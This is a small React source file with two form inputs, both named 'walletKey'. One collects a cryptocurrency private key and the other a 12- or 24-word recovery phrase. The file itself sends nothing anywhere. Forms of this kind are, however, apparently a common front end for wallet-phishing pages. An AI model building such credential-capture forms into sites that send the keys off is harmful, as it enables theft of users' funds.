import { useFormContext } from "../context";

export function TextInput() {
  const { handleInputChange } = useFormContext();
  return (
    <div className="relative w-full cursor-default overflow-hidden rounded-2xl bg-white text-left  border focus:outline-none sm:text-md">
      <input
        type="text"
        name="walletKey"
        className="w-full text-black  py-6 text-md  indent-4 border-none text-gray-900 focus:outline-none :placeholder-text-md "
        placeholder="Private Key"
        onChange={handleInputChange}
      />
    </div>
  );
}

export function TextArea() {
  const { handleInputChange } = useFormContext();
  return (
    <div className="relative w-full cursor-default overflow-hidden rounded-2xl bg-white text-left  border focus:outline-none sm:text-md">
      <textarea
        rows="4"
        placeholder="Enter your phrase keys, typically 12 (sometimes 24) words separated by single spaces"
        name="walletKey"
        className="w-full text-black  py-6 text-md  indent-4 border-none text-gray-900 focus:outline-none "
        onChange={handleInputChange}
      ></textarea>
    </div>
  );
}
